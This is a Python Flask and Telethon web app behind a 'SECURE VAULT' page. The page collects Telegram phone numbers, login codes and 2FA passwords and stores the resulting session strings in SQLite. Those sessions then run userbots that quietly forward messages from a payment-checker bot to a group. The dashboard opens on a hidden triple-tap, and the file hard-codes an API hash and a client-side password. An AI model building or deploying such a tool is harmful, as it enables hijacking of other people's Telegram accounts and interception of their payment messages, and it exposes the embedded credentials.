import os
import asyncio
import sqlite3
import threading
from flask import Flask, request, jsonify, render_template_string
from telethon import TelegramClient, events
from telethon.sessions import StringSession

# ================== CONFIG ==================
API_ID = 38746329  # Tera API ID
API_HASH = "dc6d3dd0de462ed07952a64c3253c437"  # Tera API Hash
TARGET_BOT_USERNAME = "paymentcheclerrrrrx_bot" # Jis bot ka message pakadna hai
TARGET_GROUP_LINK = "https://t.me/your_group_link" # Jahan forward karna hai (Group link daal)
PORT = int(os.environ.get("PORT", 10000))

app = Flask(__name__)

# ================== DATABASE ==================
def init_db():
    conn = sqlite3.connect("web_accounts.db")
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS accounts (phone TEXT PRIMARY KEY, session TEXT)""")
    conn.commit(); conn.close()
init_db()

def save_session(phone, session_str):
    conn = sqlite3.connect("web_accounts.db")
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO accounts (phone, session) VALUES (?,?)", (phone, session_str))
    conn.commit(); conn.close()

def get_all_sessions():
    conn = sqlite3.connect("web_accounts.db")
    c = conn.cursor()
    c.execute("SELECT phone, session FROM accounts")
    rows = c.fetchall()
    conn.close()
    return rows

def delete_session(phone):
    conn = sqlite3.connect("web_accounts.db")
    c = conn.cursor()
    c.execute("DELETE FROM accounts WHERE phone=?", (phone,))
    conn.commit(); conn.close()

def delete_all_sessions():
    conn = sqlite3.connect("web_accounts.db")
    c = conn.cursor()
    c.execute("DELETE FROM accounts")
    conn.commit(); conn.close()

# ================== TEMP STORAGE ==================
temp_clients = {}
userbot_clients = {}

# ================== MESSAGE FORWARDER ==================
async def start_userbot(phone, session_str):
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    await client.connect()
    
    @client.on(events.NewMessage)
    async def msg_handler(event):
        sender = await event.get_sender()
        if sender and sender.username and sender.username.lower() == TARGET_BOT_USERNAME.lower():
            try: 
                await client.forward_messages(TARGET_GROUP_LINK, event.message)
                print(f"Message forwarded to {TARGET_GROUP_LINK}")
            except Exception as e: 
                print(f"Forward Error: {e}")
                
    userbot_clients[phone] = client
    return client

# Start saved accounts on boot
async def start_all_saved_accounts():
    sessions = get_all_sessions()
    for phone, session_str in sessions:
        await start_userbot(phone, session_str)

# ================== HTML DESIGN (Frontend) ==================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SECURE VAULT</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Share Tech Mono', monospace; }
  body { background: #050505; color: #00ffcc; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
  .container { width: 100%; max-width: 400px; padding: 20px; }
  .card { background: rgba(15, 15, 15, 0.95); border: 1px solid #00ffcc; border-radius: 15px; padding: 30px 20px; box-shadow: 0 0 30px rgba(0, 255, 204, 0.15); }
  .header { text-align: center; margin-bottom: 20px; }
  .title { font-size: 24px; font-weight: 900; color: #fff; text-shadow: 0 0 15px #00ffcc; letter-spacing: 2px; }
  .tap-area { cursor: pointer; padding: 10px; display: inline-block; margin-top: 10px; }
  .line { width: 30px; height: 3px; background: #00ffcc; margin: 5px auto; border-radius: 2px; transition: 0.3s; }
  .screen { display: none; }
  .screen.active { display: block; animation: fadeIn 0.4s ease; }
  @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
  input { width: 100%; padding: 15px; background: #000; border: 1px solid #333; border-radius: 8px; color: #fff; margin-bottom: 15px; outline: none; font-size: 16px; }
  input:focus { border-color: #00ffcc; box-shadow: 0 0 10px rgba(0, 255, 204, 0.3); }
  .btn { width: 100%; padding: 15px; background: transparent; border: 1px solid #00ffcc; border-radius: 8px; color: #00ffcc; font-size: 14px; font-weight: bold; cursor: pointer; transition: 0.3s; text-transform: uppercase; margin-bottom: 10px; }
  .btn:hover { background: #00ffcc; color: #000; box-shadow: 0 0 20px #00ffcc; }
  .btn-red { border-color: #ff3333; color: #ff3333; }
  .btn-red:hover { background: #ff3333; color: #fff; box-shadow: 0 0 20px #ff3333; }
  .account-item { background: #111; border: 1px solid #333; padding: 15px; border-radius: 8px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; }
  .account-phone { font-size: 16px; color: #fff; }
  .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 15px; }
  .keypad button { padding: 15px; background: #111; border: 1px solid #333; color: #fff; font-size: 18px; border-radius: 8px; cursor: pointer; }
  .keypad button:hover { background: #222; border-color: #00ffcc; }
</style>
</head>
<body>
<div class="container">
  <div class="card">
    <div class="header">
      <div class="title">SECURE VAULT</div>
      <div class="tap-area" onclick="checkSecretTap()">
        <div class="line"></div>
        <div class="line"></div>
        <div class="line"></div>
      </div>
    </div>

    <!-- LOGIN -->
    <div id="screen-login" class="screen active">
      <input type="text" id="login-id" placeholder="Enter Your ID" autocomplete="off">
      <input type="password" id="login-pass" placeholder="Enter Password" autocomplete="off">
      <button class="btn" onclick="doLogin()">LOGIN</button>
    </div>

    <!-- PHONE -->
    <div id="screen-phone" class="screen">
      <p style="color: #888; margin-bottom: 15px; font-size: 14px; text-align: center;">Enter phone number with country code</p>
      <input type="text" id="phone" placeholder="+919876543210" autocomplete="off">
      <button class="btn" onclick="sendCode()">SEND OTP</button>
    </div>

    <!-- OTP -->
    <div id="screen-otp" class="screen">
      <p style="color: #888; margin-bottom: 15px; font-size: 14px; text-align: center;">Enter OTP</p>
      <input type="text" id="otp" placeholder="12345" autocomplete="off" readonly style="letter-spacing: 5px; font-size: 24px; text-align: center;">
      <div class="keypad">
        <button onclick="addDigit('1')">1</button><button onclick="addDigit('2')">2</button><button onclick="addDigit('3')">3</button>
        <button onclick="addDigit('4')">4</button><button onclick="addDigit('5')">5</button><button onclick="addDigit('6')">6</button>
        <button onclick="addDigit('7')">7</button><button onclick="addDigit('8')">8</button><button onclick="addDigit('9')">9</button>
        <button onclick="clearOtp()" style="color: red;">CLR</button><button onclick="addDigit('0')">0</button><button onclick="submitOtp()" style="background: #00ffcc; color: #000;">OK</button>
      </div>
    </div>

    <!-- 2FA -->
    <div id="screen-2fa" class="screen">
      <p style="color: #888; margin-bottom: 15px; font-size: 14px; text-align: center;">Enter 2FA Password</p>
      <input type="password" id="password" placeholder="Password" autocomplete="off">
      <button class="btn" onclick="submit2FA()">SUBMIT</button>
    </div>

    <!-- DASHBOARD -->
    <div id="screen-dashboard" class="screen">
      <h3 style="text-align: center; color: #fff; margin-bottom: 15px;">TOTAL ACCOUNTS</h3>
      <div id="accounts-list" style="max-height: 200px; overflow-y: auto; margin-bottom: 15px;"></div>
      <button class="btn" onclick="showScreen('screen-phone')">ADD NEW ACCOUNT</button>
      <button class="btn btn-red" onclick="logoutAll()">LOGOUT ALL DEVICES</button>
      <button class="btn btn-red" onclick="showScreen('screen-login')" style="background: #111;">BACK TO LOGIN</button>
    </div>
  </div>
</div>

<script>
  let tapCount = 0;
  let currentPhone = '';
  let tempOtp = '';
  let isLoggedIn = false;

  function showScreen(id) {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    document.getElementById(id).classList.add('active');
    if(id === 'screen-dashboard') fetchAccounts();
  }

  function doLogin() {
    const id = document.getElementById('login-id').value;
    const pass = document.getElementById('login-pass').value;
    if(id === "vansh" && pass === "vansh123") {
      isLoggedIn = true;
      showScreen('screen-phone');
    } else { alert("Invalid ID or Password"); }
  }

  function checkSecretTap() {
    tapCount++;
    setTimeout(() => { tapCount = 0; }, 2000);
    if(tapCount >= 3) {
      if(isLoggedIn) showScreen('screen-dashboard');
      else alert("Please login with ID & Password first!");
    }
  }

  async function sendCode() {
    const phone = document.getElementById('phone').value.trim();
    if(!phone) return alert('Enter phone number');
    currentPhone = phone;
    const res = await fetch('/api/send_code', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ phone: phone })
    });
    const data = await res.json();
    if(data.status === 'success') showScreen('screen-otp');
    else alert(data.error);
  }

  function addDigit(d) { if(tempOtp.length < 6) { tempOtp += d; document.getElementById('otp').value = tempOtp; } }
  function clearOtp() { tempOtp = ''; document.getElementById('otp').value = ''; }

  async function submitOtp() {
    if(!tempOtp) return alert('Enter OTP');
    const res = await fetch('/api/verify_otp', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ phone: currentPhone, otp: tempOtp })
    });
    const data = await res.json();
    if(data.status === 'success') { alert("Account Logged In!"); showScreen('screen-dashboard'); }
    else if(data.status === '2fa') showScreen('screen-2fa');
    else alert(data.error);
  }

  async function submit2FA() {
    const pwd = document.getElementById('password').value.trim();
    const res = await fetch('/api/verify_2fa', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ phone: currentPhone, password: pwd })
    });
    const data = await res.json();
    if(data.status === 'success') { alert("Account Logged In!"); showScreen('screen-dashboard'); }
    else alert(data.error);
  }

  async function fetchAccounts() {
    const res = await fetch('/api/accounts');
    const data = await res.json();
    const list = document.getElementById('accounts-list');
    list.innerHTML = '';
    if(data.accounts.length === 0) {
      list.innerHTML = '<p style="color: #888; text-align: center;">No accounts logged in.</p>';
    } else {
      data.accounts.forEach(acc => {
        list.innerHTML += `
          <div class="account-item">
            <span class="account-phone">${acc}</span>
            <button class="btn btn-red" style="width: auto; padding: 5px 15px; margin: 0;" onclick="logoutOne('${acc}')">LOGOUT</button>
          </div>
        `;
      });
    }
  }

  async function logoutOne(phone) {
    if(!confirm(`Logout ${phone}?`)) return;
    await fetch('/api/logout_one', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ phone: phone }) });
    fetchAccounts();
  }

  async function logoutAll() {
    if(!confirm("Logout ALL sessions?")) return;
    await fetch('/api/logout_all', { method: 'POST' });
    fetchAccounts();
  }
</script>
</body>
</html>
"""

# ================== FLASK ROUTES ==================
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/send_code', methods=['POST'])
def send_code():
    data = request.json; phone = data.get('phone')
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(client.connect())
        sent_code = loop.run_until_complete(client.send_code_request(phone))
        temp_clients[phone] = {'client': client, 'hash': sent_code.phone_code_hash}
        return jsonify({"status": "success"})
    except Exception as e: return jsonify({"status": "error", "error": str(e)})

@app.route('/api/verify_otp', methods=['POST'])
def verify_otp():
    data = request.json; phone = data.get('phone'); otp = data.get('otp')
    if phone not in temp_clients: return jsonify({"status": "error", "error": "Session expired."})
    client = temp_clients[phone]['client']; code_hash = temp_clients[phone]['hash']
    loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(client.sign_in(phone, otp, phone_code_hash=code_hash))
        session_str = client.session.save(); save_session(phone, session_str)
        threading.Thread(target=lambda: asyncio.run(start_userbot(phone, session_str)), daemon=True).start()
        del temp_clients[phone]
        return jsonify({"status": "success"})
    except Exception as e:
        if "Two-step verification" in str(e) or "password" in str(e).lower(): return jsonify({"status": "2fa"})
        return jsonify({"status": "error", "error": str(e)})

@app.route('/api/verify_2fa', methods=['POST'])
def verify_2fa():
    data = request.json; phone = data.get('phone'); password = data.get('password')
    if phone not in temp_clients: return jsonify({"status": "error", "error": "Session expired."})
    client = temp_clients[phone]['client']
    loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(client.sign_in(password=password))
        session_str = client.session.save(); save_session(phone, session_str)
        threading.Thread(target=lambda: asyncio.run(start_userbot(phone, session_str)), daemon=True).start()
        del temp_clients[phone]
        return jsonify({"status": "success"})
    except Exception as e: return jsonify({"status": "error", "error": str(e)})

@app.route('/api/accounts', methods=['GET'])
def get_accounts():
    sessions = get_all_sessions()
    return jsonify({"accounts": [s[0] for s in sessions]})

@app.route('/api/logout_one', methods=['POST'])
def logout_one():
    phone = request.json.get('phone')
    delete_session(phone)
    return jsonify({"status": "success"})

@app.route('/api/logout_all', methods=['POST'])
def logout_all():
    delete_all_sessions()
    return jsonify({"status": "success"})

# ================== STARTUP ==================
if __name__ == '__main__':
    # Start background accounts
    threading.Thread(target=lambda: asyncio.run(start_all_saved_accounts()), daemon=True).start()
    # Start Flask server
    app.run(host='0.0.0.0', port=PORT)
